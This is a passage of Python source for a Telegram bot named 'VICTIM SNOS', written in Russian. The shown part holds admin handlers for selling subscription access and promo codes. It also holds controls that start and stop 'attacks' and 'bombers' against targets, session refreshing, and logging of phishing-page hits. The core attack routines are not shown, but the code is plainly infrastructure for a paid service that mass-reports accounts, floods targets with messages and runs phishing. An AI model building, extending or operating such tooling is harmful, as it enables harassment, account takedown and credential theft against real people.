    await cb.message.answer("<b>VICTIM SNOS</b>\n\nВведите ID пользователя:", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="admin_menu")]]))

@dp.callback_query(F.data == "admin_add_days")
async def admin_add_days_start(cb: types.CallbackQuery, state: FSMContext):
    if cb.from_user.id != ADMIN_ID:
        return
    await state.set_state(AdminState.waiting_user_id)
    await state.update_data(admin_action="add_days")
    await cb.message.delete()
    await cb.message.answer("<b>VICTIM SNOS</b>\n\nВведите ID пользователя:", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="admin_menu")]]))

@dp.message(StateFilter(AdminState.waiting_user_id))
async def admin_user_id_received(msg: types.Message, state: FSMContext):
    if msg.from_user.id != ADMIN_ID:
        return
    try:
        user_id = int(msg.text.strip())
        await state.update_data(target_user_id=user_id)
        data = await state.get_data()
        action = data.get("admin_action", "add_forever")
        
        if action == "add_forever":
            add_subscription(user_id, forever=True)
            await msg.delete()
            await send_message_with_banner(msg, f"Пользователь <code>{user_id}</code> добавлен", get_admin_menu())
            await state.clear()
        elif action == "add_days":
            await state.set_state(AdminState.waiting_add_days)
            await msg.delete()
            await send_message_with_banner(msg, "Введите количество дней:")
    except:
        await msg.delete()
        await send_message_with_banner(msg, "Неверный ID!")
        await state.clear()

@dp.message(StateFilter(AdminState.waiting_add_days))
async def admin_days_received(msg: types.Message, state: FSMContext):
    if msg.from_user.id != ADMIN_ID:
        return
    try:
        days = int(msg.text.strip())
        data = await state.get_data()
        user_id = data["target_user_id"]
        add_subscription(user_id, days=days)
        await msg.delete()
        await send_message_with_banner(msg, f"Добавлено {days} дней пользователю <code>{user_id}</code>", get_admin_menu())
    except:
        await msg.delete()
        await send_message_with_banner(msg, "Неверное количество дней!")
    await state.clear()

@dp.callback_query(F.data == "admin_create_promo")
async def admin_create_promo_start(cb: types.CallbackQuery, state: FSMContext):
    if cb.from_user.id != ADMIN_ID:
        return
    await state.set_state(AdminState.waiting_promo_code)
    await cb.message.delete()
    await cb.message.answer("<b>VICTIM SNOS</b>\n\nВведите промокод:", reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="Отмена", callback_data="admin_menu")]]))

@dp.message(StateFilter(AdminState.waiting_promo_code))
async def admin_promo_code(msg: types.Message, state: FSMContext):
    if msg.from_user.id != ADMIN_ID:
        return
    code = msg.text.strip().upper()
    await state.update_data(promo_code=code)
    await state.set_state(AdminState.waiting_promo_days)
    await msg.delete()
    await send_message_with_banner(msg, "Введите количество дней:")

@dp.message(StateFilter(AdminState.waiting_promo_days))
async def admin_promo_days(msg: types.Message, state: FSMContext):
    if msg.from_user.id != ADMIN_ID:
        return
    try:
        days = int(msg.text.strip())
        await state.update_data(promo_days=days)
        await state.set_state(AdminState.waiting_promo_uses)
        await msg.delete()
        await send_message_with_banner(msg, "Введите количество использований:")
    except:
        await msg.delete()
        await send_message_with_banner(msg, "Неверное число!")

@dp.message(StateFilter(AdminState.waiting_promo_uses))
async def admin_promo_uses(msg: types.Message, state: FSMContext):
    if msg.from_user.id != ADMIN_ID:
        return
    try:
        uses = int(msg.text.strip())
        data = await state.get_data()
        code = data["promo_code"]
        days = data["promo_days"]
        
        promo_codes[code] = {"days": days, "uses": uses}
        save_promo_codes()
        
        await msg.delete()
        await send_message_with_banner(msg, f"Промокод <code>{code}</code> создан!\nДней: {days}\nИспользований: {uses}", get_admin_menu())
    except:
        await msg.delete()
        await send_message_with_banner(msg, "Неверное число!")
    await state.clear()

@dp.callback_query(F.data == "admin_remove")
async def admin_remove(cb: types.CallbackQuery):
    if cb.from_user.id != ADMIN_ID or not ALLOWED_USERS:
        await cb.answer("Нет пользователей", show_alert=True)
        return
    builder = InlineKeyboardBuilder()
    for uid in list(ALLOWED_USERS.keys())[:20]:
        builder.button(text=f"Удалить {uid}", callback_data=f"remove_{uid}")
    builder.button(text="НАЗАД", callback_data="admin_menu")
    builder.adjust(1)
    await edit_message_with_banner(cb, "Выберите пользователя:", builder.as_markup())

@dp.callback_query(F.data.startswith("remove_"))
async def admin_remove_process(cb: types.CallbackQuery):
    if cb.from_user.id != ADMIN_ID:
        return
    user_id = cb.data.replace("remove_", "")
    if user_id in ALLOWED_USERS:
        del ALLOWED_USERS[user_id]
        save_allowed_users()
    await edit_message_with_banner(cb, f"Пользователь <code>{user_id}</code> удален", get_admin_menu())

@dp.callback_query(F.data == "admin_list")
async def admin_list(cb: types.CallbackQuery):
    if cb.from_user.id != ADMIN_ID:
        return
    text = "Пользователи:\n\n"
    for uid, data in list(ALLOWED_USERS.items())[:30]:
        expire = data.get("expire_date", "неизвестно")
        if expire != "forever":
            try:
                expire = datetime.fromisoformat(expire).strftime("%d.%m.%Y")
            except:
                pass
        text += f"<code>{uid}</code> - {expire}\n"
    
    if not ALLOWED_USERS:
        text += "Пусто"
    
    await edit_message_with_banner(cb, text, InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="НАЗАД", callback_data="admin_menu")]]))

@dp.callback_query(F.data == "main_menu")
async def main_menu(cb: types.CallbackQuery, state: FSMContext):
    await state.clear()
    await edit_message_with_banner(cb, "Выберите действие:", get_main_menu(cb.from_user.id))

@dp.callback_query(F.data == "refresh_sessions")
async def refresh_sessions(cb: types.CallbackQuery):
    if cb.from_user.id in active_attacks:
        await cb.answer("Нельзя обновить во время сноса!", show_alert=True)
        return
    await cb.answer("Обновление...")
    asyncio.create_task(refresh_user_sessions(cb.from_user.id))

@dp.callback_query(F.data == "status")
async def status(cb: types.CallbackQuery):
    user_id = cb.from_user.id
    user_id_str = str(user_id)
    expire = "Нет доступа"
    if user_id_str in ALLOWED_USERS:
        expire = ALLOWED_USERS[user_id_str].get("expire_date", "неизвестно")
        if expire != "forever":
            try:
                expire = datetime.fromisoformat(expire).strftime("%d.%m.%Y")
            except:
                pass
    
    sessions_count = len(user_sessions.get(user_id, {}).get("sessions", []))
    await edit_message_with_banner(cb, f"ID: <code>{user_id}</code>\nДоступ: {expire}\nСессий: {sessions_count}", InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="НАЗАД", callback_data="main_menu")]]))

@dp.callback_query(F.data == "stop")
async def stop(cb: types.CallbackQuery):
    user_id = cb.from_user.id
    stopped = False
    
    if user_id in active_attacks:
        active_attacks[user_id]["stop_event"].set()
        del active_attacks[user_id]
        stopped = True
    
    if user_id in active_bombers:
        active_bombers[user_id]["stop_event"].set()
        del active_bombers[user_id]
        stopped = True
    
    await edit_message_with_banner(cb, "Остановлено" if stopped else "Нет активных атак", get_main_menu(user_id))

@dp.message(F.photo)
async def handle_photo(msg: types.Message):
    if msg.caption:
        for page_id, page in phish_pages.items():
            if page_id in msg.caption or "Фото" in msg.caption:
                add_log(msg.from_user.id if msg.from_user else 0, "Фишинг фото", page['url'])
                break


# ---------- ЗАПУСК ----------
async def main():
    load_allowed_users()
    load_payments()
    load_promo_codes()
    
    os.makedirs("sessions", exist_ok=True)
    
    logger.info("VICTIM SNOS запущен")
    
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
if __name__ == "__main__":
    asyncio.run(main())
